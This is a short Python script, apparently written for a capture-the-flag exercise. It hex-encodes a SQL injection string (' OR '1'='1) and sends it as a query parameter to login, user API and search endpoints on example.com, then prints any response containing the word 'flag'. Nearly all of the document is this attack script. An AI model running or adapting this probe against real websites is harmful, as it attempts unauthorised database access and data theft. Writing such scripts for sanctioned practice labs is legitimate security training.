import requests

BASE_URL = "http://example.com"
TARGET_STR = "back-end' OR '1'='1"
PATHS = ["/login", "/api/user", "/search"]

def str_to_hex(s):
    return "0x" + s.encode().hex()

def main():
    hex_payload = str_to_hex(TARGET_STR)
    print(f"Original String: {TARGET_STR}")
    print(f"Hex Payload: {hex_payload}")

    session = requests.Session()
    session.headers.update({"User-Agent": "CTF-Pentest-Bot/1.0"})

    for path in PATHS:
        target_url = BASE_URL + path
        params = {"id": hex_payload}
        try:
            print(f"\n[*] Testing {target_url} with hex payload...")
            response = session.get(target_url, params=params, timeout=5)
            print(f"[+] Status Code: {response.status_code}")
            if "flag" in response.text.lower():
                print("[!] Potential flag found in response!")
                print(response.text)
        except requests.RequestException as e:
            print(f"[-] Request failed for {target_url}: {e}")

if __name__ == "__main__":
    main()